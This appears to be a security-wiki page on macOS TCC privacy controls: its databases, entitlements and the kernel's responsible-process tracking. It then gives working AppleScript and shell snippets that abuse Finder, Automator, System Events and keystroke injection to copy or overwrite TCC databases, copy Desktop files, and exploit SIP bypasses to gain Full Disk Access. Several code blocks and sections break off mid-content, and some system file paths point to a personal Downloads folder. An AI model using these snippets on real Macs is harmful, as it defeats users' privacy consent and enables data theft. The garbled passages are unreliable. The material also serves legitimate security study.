_body: "# macOS TCC\n\n{{#include ../../../../banners/hacktricks-training.md}}\n\n## **Basic Information**\n\n**TCC (Transparency,\
  \ Consent, and Control)** is a security protocol focusing on regulating application permissions. Its primary role is to\
  \ safeguard sensitive features like **location services, contacts, photos, microphone, camera, accessibility, and full disk\
  \ access**. By mandating explicit user consent before granting app access to these elements, TCC enhances privacy and user\
  \ control over their data.\n\nUsers encounter TCC when applications request access to protected features. This is visible\
  \ through a prompt that allows users to **approve or deny access**. Furthermore, TCC accommodates direct user actions, such\
  \ as **dragging and dropping files into an application**, to grant access to specific files, ensuring that applications\
  \ have access only to what is explicitly permitted.\n\n![An example of a TCC prompt](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)\n\
  \n**TCC** is handled by the **daemon** located in `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` and configured\
  \ in `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` (registering the mach service `com.apple.tccd.system`).\n\
  \nThere is a **user-mode tccd** running per logged in user defined in `/System/Library/LaunchAgents/com.apple.tccd.plist`\
  \ registering the mach services `com.apple.tccd` and `com.apple.usernotifications.delegate.com.apple.tccd`.\n\nHere you\
  \ can see the tccd running as system and as user:\n\n```bash\nps -ef | grep tcc\n    0   374     1   0 Thu07PM ??      \
  \   2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system\n  501 63079     1   0  6:59PM ??      \
  \   0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd\n```\n\nPermissions are **inherited from the parent**\
  \ application and the **permissions** are **tracked** based on the **Bundle ID** and the **Developer ID**.\n\n### TCC Databases\n\
  \nThe allowances/denies then stored in some TCC databases:\n\n- The system-wide database in **`/Library/Application Support/com.apple.TCC/TCC.db`**\
  \ .\n  - This database is **SIP protected**, so only a SIP bypass can write into it.\n- The user TCC database **`$HOME/Library/Application\
  \ Support/com.apple.TCC/TCC.db`** for per-user preferences.\n  - This database is protected so only processes with high\
  \ TCC privileges like Full Disk Access can write to it (but i't not protected by SIP).\n\n> [!WARNING]\n> The previous databases\
  \ are also **TCC protected for read access**. So you **won't be able to read** your regular user TCC database unless it's\
  \ from a TCC privileged process.\n>\n> However, remember that a process with these high privileges (like **FDA** or **`kTCCServiceEndpointSecurityClient`**)\
  \ will be able to write the users TCC database\n\n- There is a **third** TCC database in **`/var/db/locationd/clients.plist`**\
  \ to indicate clients allowed to **access location services**.\n- The SIP protected file **`/Users/carlospolop/Downloads/REG.db`**\
  \ (also protected from read access with TCC), contains the **location** of all the **valid TCC databases**.\n- The SIP protected\
  \ file **`/Users/carlospolop/Downloads/MDMOverrides.plist`** (also protected from read access with TCC), contains more TCC\
  \ granted permissions.\n- The SIP protected file **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`**\
  \ (bu readable by anyone) is an allow list of applications that require a TCC exception.\n\n> [!TIP]\n> The TCC database\
  \ in **iOS** is in **`/private/var/mobile/Library/TCC/TCC.db`**\n\n> [!TIP]\n> The **notification center UI** can make **changes\
  \ in the system TCC database**:\n>\n> ```bash\n> codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/>\
  \ Support/tccd\n> [..]\n> com.apple.private.tcc.manager\n> com.apple.rootless.storage.TCC\n> ```\n>\n> However, users can\
  \ **delete or query rules** with the **`tccutil`** command line utility.\n\n#### Query the databases\n\n{{#tabs}}\n{{#tab\
  \ name=\"user DB\"}}\n\n```bash\nsqlite3 ~/Library/Application\\ Support/com.apple.TCC/TCC.db\nsqlite> .schema\n# Tables:\
  \ admin, policies, active_policy, access, access_overrides, expired, active_policy_id\n# The table access contains the permissions\
  \ per services\nsqlite> select service, client, auth_value, auth_reason from access;\nkTCCServiceLiverpool|com.apple.syncdefaultsd|2|4\n\
  kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2\nkTCCServiceMicrophone|us.zoom.xos|2|2\n[...]\n\n#\
  \ Check user approved permissions for telegram\nsqlite> select * from access where client LIKE \"%telegram%\" and auth_value=2;\n\
  # Check user denied permissions for telegram\nsqlite> select * from access where client LIKE \"%telegram%\" and auth_value=0;\n\
  ```\n\n{{#endtab}}\n\n{{#tab name=\"system DB\"}}\n\n```bash\nsqlite3 /Library/Application\\ Support/com.apple.TCC/TCC.db\n\
  sqlite> .schema\n# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id\n# The table\
  \ access contains the permissions per services\nsqlite> select service, client, auth_value, auth_reason from access;\nkTCCServiceLiverpool|com.apple.syncdefaultsd|2|4\n\
  kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2\nkTCCServiceMicrophone|us.zoom.xos|2|2\n[...]\n\n#\
  \ Get all FDA\nsqlite> select service, client, auth_value, auth_reason from access where service = \"kTCCServiceSystemPolicyAllFiles\"\
  \ and auth_value=2;\n\n# Check user approved permissions for telegram\nsqlite> select * from access where client LIKE \"\
  %telegram%\" and auth_value=2;\n# Check user denied permissions for telegram\nsqlite> select * from access where client\
  \ LIKE \"%telegram%\" and auth_value=0;\n```\n\n{{#endtab}}\n{{#endtabs}}\n\n> [!TIP]\n> Checking both databases you can\
  \ check the permissions an app has allowed, has forbidden, or doesn't have (it will ask for it).\n\n- The **`service`**\
  \ is the TCC **permission** string representation\n- The **`client`** is the **bundle ID** or **path to binary** with the\
  \ permissions\n- The **`client_type`** indicates whether it’s a Bundle Identifier(0) or an absolute path(1)\n\n<details>\n\
  \n<summary>How to execute if it's an absolute path</summary>\n\nJust do **`launctl load you_bin.plist`**, with a plist like:\n\
  \n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"\
  >\n<plist version=\"1.0\">\n<dict>\n    <!-- Label for the job -->\n    <key>Label</key>\n    <string>com.example.yourbinary</string>\n\
  \n    <!-- The path to the executable -->\n    <key>Program</key>\n    <string>/path/to/binary</string>\n\n    <!-- Arguments\
  \ to pass to the executable (if any) -->\n    <key>ProgramArguments</key>\n    <array>\n        <string>arg1</string>\n\
  \        <string>arg2</string>\n    </array>\n\n    <!-- Run at load -->\n    <key>RunAtLoad</key>\n    <true/>\n\n    <!--\
  \ Keep the job alive, restart if necessary -->\n    <key>KeepAlive</key>\n    <true/>\n\n    <!-- Standard output and error\
  \ paths (optional) -->\n    <key>StandardOutPath</key>\n    <string>/tmp/YourBinary.stdout</string>\n    <key>StandardErrorPath</key>\n\
  \    <string>/tmp/YourBinary.stderr</string>\n</dict>\n</plist>\n```\n\n</details>\n\n- The **`auth_value`** can have different\
  \ values: denied(0), unknown(1), allowed(2), or limited(3).\n- The **`auth_reason`** can take the following values: Error(1),\
  \ User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8),\
  \ Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)\n- The **csreq** field is there to indicate\
  \ how to verify the binary to execute and grant the TCC permissions:\n\n```bash\n# Query to get cserq in printable hex\n\
  select service, client, hex(csreq) from access where auth_value=2;\n\n# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):\n\

  \nYou could also check **already given permissions** to apps in `System Preferences --> Security & Privacy --> Privacy -->\
  \ Files and Folders`.\n\n> [!TIP]\n> Users _can_ **delete or query rules** using **`tccutil`** .\n\n#### Reset TCC permissions\n\
  \n```bash\n# You can reset all the permissions given to an application with\ntccutil reset All app.some.id\n\n# Reset the\
  \ permissions granted to all apps\ntccutil reset All\n```\n\n### TCC Signature Checks\n\nThe TCC **database** stores the\
  \ **Bundle ID** of the application, but it also **stores** **information** about the **signature** to **make sure** the\
  \ App asking to use the a permission is the correct one.\n\n```bash\n# From sqlite\nsqlite> select service, client, hex(csreq)\
  \ from access where auth_value=2;\n#Get csreq\n\n# From bash\necho FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000\

  \ name and bundle ID won't be able to access granted permissions given to other apps.\n\n### Entitlements & TCC Permissions\n\
  \nApps **don't only need** to **request** and have been **granted access** to some resources, they also need to **have the\
  \ relevant entitlements**.\\\nFor example **Telegram** has the entitlement `com.apple.security.device.camera` to request\
  \ **access to the camera**. An **app** that **doesn't** have this **entitlement won't be able** to access the camera (and\
  \ the user won't even be asked for the permissions).\n\nNote that entitlements are plist files and are part of code sig,\
  \ further hashed in code sig by special slots and may be either queried in kernel by kernel code or by user model code using\
  \ `csops(#169)` or `csops_audittoken(#170)`.\n\nHowever, for apps to **access** to **certain user folders**, such as `~/Desktop`,\
  \ `~/Downloads` and `~/Documents`, they **don't need** to have any specific **entitlements.** The system will transparently\
  \ handle access and **prompt the user** as needed.\n\n- [https://newosxbook.com/ent.php](https://newosxbook.com/ent.php)\n\
  \nApple's apps **won’t generate prompts**. They contain **pre-granted rights** in their **entitlements** list, meaning they\
  \ will **never generate a popup**, **nor** they will show up in any of the **TCC databases.** For example:\n\n```bash\n\
  codesign -dv --entitlements :- /System/Applications/Calendar.app\n[...]\n<key>com.apple.private.tcc.allow</key>\n<array>\n\
  \    <string>kTCCServiceReminders</string>\n    <string>kTCCServiceCalendar</string>\n    <string>kTCCServiceAddressBook</string>\n\
  </array>\n```\n\nThis will avoid Calendar ask the user to access reminders, calendar and the address book.\n\n> [!TIP]\n\
  > Apart from some official documentation about entitlements it's also possible to find unofficial **interesting information\
  \ about entitlements in** [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl)\n\nSome TCC permissions are:\
  \ kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... There is no public list that defines all of them but\
  \ you can check this [**list of known ones**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service).\n\n###\
  \ Sensitive unprotected places\n\n- $HOME (itself)\n- $HOME/.ssh, $HOME/.aws, etc\n- /tmp\n\n### User Intent / com.apple.macl\n\
  \nAs mentioned previously, it is possible to **grant access to an App to a file by dragging\\&dropping it to it**. This\
  \ access won't be specified in any TCC database but as an **extended** **attribute of the file**. This attribute will **store\
  \ the UUID** of the allowed app:\n\n```bash\nxattr Desktop/private.txt\ncom.apple.macl\n\n# Check extra access to the file\n\
  ## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command\n\
  macl_read Desktop/private.txt\nFilename,Header,App UUID\n\"Desktop/private.txt\",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3\n\
  \n# Get the UUID of the app\notool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid\n \
  \   uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3\n```\n\n> [!TIP]\n> It's curious that the **`com.apple.macl`** attribute is\
  \ managed by the **Sandbox**, not tccd.\n>\n> Also note that if you move a file that allows the UUID of an app in your computer\
  \ to a different computer, because the same app will have different UIDs, it won't grant access to that app.\n\nThe extended\
  \ attribute `com.apple.macl` **can’t be cleared** like other extended attributes because it’s **protected by SIP**. However,\
  \ as [**explained in this post**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), it's possible\
  \ to disable it **zipping** the file, **deleting** it and **unzipping** it.\n\n\n\n\n\n\n## XNU Responsible Process Mechanism\n\
  \nIn macOS/iOS, the **responsible process** mechanism is a critical security feature used by the **TCC (Transparency, Consent,\
  \ and Control)** framework and other security systems to track which process is ultimately responsible for an action, even\
  \ through chains of child processes.\n\nWhen TCC checks permissions (e.g., camera, microphone, location), it doesn't always\
  \ check the immediate process making the request. Instead, it checks the **responsible process** - typically the GUI application\
  \ that initiated the action, even if the actual request comes from a helper process or daemon.\n\n<details>\n<summary>How\
  \ Responsible Process is Set</summary>\n\n### Process Structure Fields\n\nEach process in XNU maintains two key UUID identifiers:\n\
  \n```c\n// From bsd/sys/proc_internal.h\nstruct proc {\n    // ...\n    pid_t   p_responsible_pid;          // PID of the\
  \ responsible process\n    uint8_t p_uuid[16];                 // UUID from LC_UUID load command (self)\n    uint8_t p_responsible_uuid[16];\
  \     // UUID of pid responsible for this process\n    // ...\n};\n```\n\n- **`p_uuid`**: The process's own UUID (from its\
  \ Mach-O binary's `LC_UUID` load command)\n- **`p_responsible_pid`**: The PID of the responsible process\n- **`p_responsible_uuid`**:\
  \ The UUID of the responsible process (persists even after that process exits)\n\n### How Responsible Process is Set\n\n\
  1. **During Process Creation (Fork)**\n\nWhen a new process is created via `fork()` or `posix_spawn()`, the responsible\
  \ process is inherited from the parent (the `exec()` syscall reuses the existing `proc` structure, so this step is not repeated\
  \ there):\n\n**Location**: `bsd/kern/kern_fork.c:1053`\n\n```c\n// In fork1_internal() - called during all process creation\n\
  proc_set_responsible_pid(child_proc, parent_proc->p_responsible_pid);\n```\n\n**Key Points:**\n- Child processes **inherit**\
  \ the parent's `p_responsible_pid`\n- This creates a **chain of responsibility** through the process hierarchy\n- The responsible\
  \ process typically points to the original GUI application\n\n2. **The Core Function: `proc_set_responsible_pid()`**\n\n\
  **Location**: `bsd/kern/kern_proc.c:4817-4831`\n\n```c\nvoid\nproc_set_responsible_pid(proc_t target_proc, pid_t responsible_pid)\n\
  {\n    target_proc->p_responsible_pid = responsible_pid;\n    \n    if (responsible_pid >= 0) {\n        proc_t responsible_proc\
  \ = proc_find(responsible_pid);\n        if (responsible_proc != PROC_NULL) {\n            // Copy the responsible process's\
  \ UUID for persistent identification\n            proc_getexecutableuuid(responsible_proc, \n                target_proc->p_responsible_uuid,\
  \ \n                sizeof(target_proc->p_responsible_uuid));\n            proc_rele(responsible_proc);\n        }\n   \
  \ }\n    return;\n}\n```\n\n**What this function does:**\n1. **Sets the responsible PID** in the target process\n2. **Looks\
  \ up the responsible process** using `proc_find()` (increments reference count)\n3. **Copies the UUID** from the responsible\
  \ process's `p_uuid` to the target process's `p_responsible_uuid`\n4. **Releases the reference** with `proc_rele()` (decrements\
  \ reference count)\n\n3. **Why Store Both PID and UUID?**\n\nThe dual-storage approach solves a critical problem:\n\n| Field\
  \ | Purpose | Problem | Solution |\n|-------|---------|---------|----------|\n| `p_responsible_pid` | Fast lookup of current\
  \ process | PID can be reused after process exits | Used for active process lookup |\n| `p_responsible_uuid` | Persistent\
  \ identification | Survives process termination | Used for security checks and auditing |\n\n**The Problem**: If the responsible\
  \ process exits before the child, the PID might be recycled and assigned to a completely different process.\n\n**The Solution**:\
  \ The UUID is immutable and uniquely identifies the specific binary that was responsible, even after it exits.\n\n### Process\

  \ an app with some TCC permissions check the following page with TCC payloads to abuse them:\n\n\n{{#ref}}\nmacos-tcc-payloads.md\n\
  {{#endref}}\n\n### Apple Events\n\nLearn about Apple Events in:\n\n\n{{#ref}}\nmacos-apple-events.md\n{{#endref}}\n\n###\
  \ Automation (Finder) to FDA\\*\n\nThe TCC name of the Automation permission is: **`kTCCServiceAppleEvents`**\\\nThis specific\
  \ TCC permission also indicates the **application that can be managed** inside the TCC database (so the permissions doesn't\
  \ allow just to manage everything).\n\n**Finder** is an application that **always has FDA** (even if it doesn't appear in\
  \ the UI), so if you have **Automation** privileges over it, you can abuse its privileges to **make it do some actions**.\\\
  \nIn this case your app would need the permission **`kTCCServiceAppleEvents`** over **`com.apple.Finder`**.\n\n{{#tabs}}\n\
  {{#tab name=\"Steal users TCC.db\"}}\n\n```applescript\n# This AppleScript will copy the system TCC database into /tmp\n\
  osascript<<EOD\ntell application \"Finder\"\n    set homeFolder to path to home folder as string\n    set sourceFile to\
  \ (homeFolder & \"Library:Application Support:com.apple.TCC:TCC.db\") as alias\n    set targetFolder to POSIX file \"/tmp\"\
  \ as alias\n    duplicate file sourceFile to targetFolder with replacing\nend tell\nEOD\n```\n\n{{#endtab}}\n\n{{#tab name=\"\
  Steal systems TCC.db\"}}\n\n```applescript\nosascript<<EOD\ntell application \"Finder\"\n    set sourceFile to POSIX file\
  \ \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias\n    set targetFolder to POSIX file \"/tmp\" as alias\n\
  \    duplicate file sourceFile to targetFolder with replacing\nend tell\nEOD\n```\n\n{{#endtab}}\n{{#endtabs}}\n\nYou could\
  \ abuse this to **write your own user TCC database**.\n\n> [!WARNING]\n> With this permission you will be able to **ask\
  \ finder to access TCC restricted folders** and give you the files, but afaik you **won't be able to make Finder execute\
  \ arbitrary code** to fully abuse his FDA access.\n>\n> Therefore, you won't be able to abuse the full FDA habilities.\n\
  \nThis is the TCC prompt to get Automation privileges over Finder:\n\n<figure><img src=\"../../../../images/image (27).png\"\
  \ alt=\"\" width=\"244\"><figcaption></figcaption></figure>\n\n> [!CAUTION]\n> Note that because the **Automator** app has\
  \ the TCC permission **`kTCCServiceAppleEvents`**, it can **control any app**, like Finder. So having the permission to\
  \ control Automator you could also control the **Finder** with a code like the one below:\n\n<details>\n\n<summary>Get a\
  \ shell inside Automator</summary>\n\n```applescript\nosascript<<EOD\nset theScript to \"touch /tmp/something\"\n\ntell\
  \ application \"Automator\"\n   set actionID to Automator action id \"com.apple.RunShellScript\"\n   tell (make new workflow)\n\
  \      add actionID to it\n      tell last Automator action\n         set value of setting \"inputMethod\" to 1\n      \
  \   set value of setting \"COMMAND_STRING\" to theScript\n      end tell\n      execute it\n   end tell\n   activate\nend\
  \ tell\nEOD\n# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and\
  \ not TCC prompt will appear\n```\n\n</details>\n\nSame happens with **Script Editor app,** it can control Finder, but using\
  \ an AppleScript you cannot force it to execute a script.\n\n### Automation (SE) to some TCC\n\n**System Events can create\
  \ Folder Actions, and Folder actions can access some TCC folders** (Desktop, Documents & Downloads), so a script like the\
  \ following one can be used to abuse this behaviour:\n\n```bash\n# Create script to execute with the action\ncat > \"/tmp/script.js\"\
  \ <<EOD\nvar app = Application.currentApplication();\napp.includeStandardAdditions = true;\napp.doShellScript(\"cp -r $HOME/Desktop\
  \ /tmp/desktop\");\nEOD\n\nosacompile -l JavaScript -o \"$HOME/Library/Scripts/Folder Action Scripts/script.scpt\" \"/tmp/script.js\"\
  \n\n# Create folder action with System Events in \"$HOME/Desktop\"\nosascript <<EOD\ntell application \"System Events\"\n\
  \    -- Ensure Folder Actions are enabled\n    set folder actions enabled to true\n\n    -- Define the path to the folder\
  \ and the script\n    set homeFolder to path to home folder as text\n    set folderPath to homeFolder & \"Desktop\"\n  \
  \  set scriptPath to homeFolder & \"Library:Scripts:Folder Action Scripts:script.scpt\"\n\n    -- Create or get the Folder\
  \ Action for the Desktop\n    if not (exists folder action folderPath) then\n        make new folder action at end of folder\
  \ actions with properties {name:folderPath, path:folderPath}\n    end if\n    set myFolderAction to folder action folderPath\n\
  \n    -- Attach the script to the Folder Action\n    if not (exists script scriptPath of myFolderAction) then\n        make\
  \ new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}\n    end if\n\n    --\
  \ Enable the Folder Action and the script\n    enable myFolderAction\nend tell\nEOD\n\n# File operations in the folder should\
  \ trigger the Folder Action\ntouch \"$HOME/Desktop/file\"\nrm \"$HOME/Desktop/file\"\n```\n\n### Automation (SE) + Accessibility\
  \ (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**)** to FDA\\*\n\nAutomation on **`System Events`** + Accessibility\
  \ (**`kTCCServicePostEvent`**) allows to send **keystrokes to processes**. This way you could abuse Finder to change the\
  \ users TCC.db or to give FDA to an arbitrary app (although password might be prompted for this).\n\nFinder overwriting\
  \ users TCC.db example:\n\n```applescript\n-- store the TCC.db file to copy in /tmp\nosascript <<EOF\ntell application \"\
  System Events\"\n    -- Open Finder\n    tell application \"Finder\" to activate\n\n    -- Open the /tmp directory\n   \
  \ keystroke \"g\" using {command down, shift down}\n    delay 1\n    keystroke \"/tmp\"\n    delay 1\n    keystroke return\n\
  \    delay 1\n\n    -- Select and copy the file\n    keystroke \"TCC.db\"\n    delay 1\n    keystroke \"c\" using {command\
  \ down}\n    delay 1\n\n    -- Resolve $HOME environment variable\n    set homePath to system attribute \"HOME\"\n\n   \
  \ -- Navigate to the Desktop directory under $HOME\n    keystroke \"g\" using {command down, shift down}\n    delay 1\n\
  \    keystroke homePath & \"/Library/Application Support/com.apple.TCC\"\n    delay 1\n    keystroke return\n    delay 1\n\
  \n    -- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)\n\
  \    keystroke \"TCC.db\"\n    delay 1\n    keystroke return\n    delay 1\n    key code 51 using {command down}\n    delay\
  \ 1\n\n    -- Paste the file\n    keystroke \"v\" using {command down}\nend tell\nEOF\n```\n\n### `kTCCServiceAccessibility`\
  \ to FDA\\*\n\nCheck this page for some [**payloads to abuse the Accessibility permissions**](macos-tcc-payloads.md#accessibility)\
  \ to privesc to FDA\\* or run a keylogger for example.\n\n### **Endpoint Security Client to FDA**\n\nIf you have **`kTCCServiceEndpointSecurityClient`**,\
  \ you have FDA. End.\n\n### System Policy SysAdmin File to FDA\n\n**`kTCCServiceSystemPolicySysAdminFiles`** allows to **change**\
  \ the **`NFSHomeDirectory`** attribute of a user that changes his home folder and therefore allows to **bypass TCC**.\n\n\
  ### User TCC DB to FDA\n\nObtaining **write permissions** over the **user TCC** database you **can'**t grant yourself **`FDA`**\
  \ permissions, only the one that lives in the system database can grant that.\n\nBut you can **can** give yourself **`Automation\
  \ rights to Finder`**, and abuse the previous technique to escalate to FDA\\*.\n\n### **FDA to TCC permissions**\n\n**Full\
  \ Disk Access** is TCC name is **`kTCCServiceSystemPolicyAllFiles`**\n\nI don't think this is a real privesc, but just in\
  \ case you find it useful: If you control a program with FDA you can **modify the users TCC database and give yourself any\
  \ access**. This can be useful as a persistence technique in case you might lose your FDA permissions.\n\n### **SIP Bypass\
  \ to TCC Bypass**\n\nThe system **TCC database** is protected by **SIP**, that's why only processes with the **indicated\
  \ entitlements are going to be able to modify** it. Therefore, if an attacker finds a **SIP bypass** over a **file** (be\
  \ able to modify a file restricted by SIP), he will be able to:\n\n- **Remove the protection** of a TCC database, and give\
  \ himself all TCC permissions. He could abuse any of these files for example:\n  - The TCC systems database\n  - REG.db\n\
  \  - MDMOverrides.plist\n\nHowever, there is another option to abuse this **SIP bypass to bypass TCC**, the file `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`\
  \ is an allow list of applications that require a TCC exception. Therefore, if an attacker can **remove the SIP protection**\
  \ from this file and add his **own application** the application will be able to bypass TCC.\\\nFor example to add terminal:\n\
  \n```bash\n# Get needed info\ncodesign -d -r- /System/Applications/Utilities/Terminal.app\n```\n\nAllowApplicationsList.plist:\n\
  \n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"\
  >\n<plist version=\"1.0\">\n<dict>\n\t<key>Services</key>\n\t<dict>\n\t\t<key>SystemPolicyAllFiles</key>\n\t\t<array>\n\t\
  \t\t<dict>\n\t\t\t\t<key>CodeRequirement</key>\n\t\t\t\t<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>\n\
  \t\t\t\t<key>IdentifierType</key>\n\t\t\t\t<string>bundleID</string>\n\t\t\t\t<key>Identifier</key>\n\t\t\t\t<string>com.apple.Terminal</string>\n\
  \t\t\t</dict>\n\t\t</array>\n\t</dict>\n</dict>\n</plist>\n```\n\n### TCC Bypasses\n\n\n{{#ref}}\nmacos-tcc-bypasses/\n\
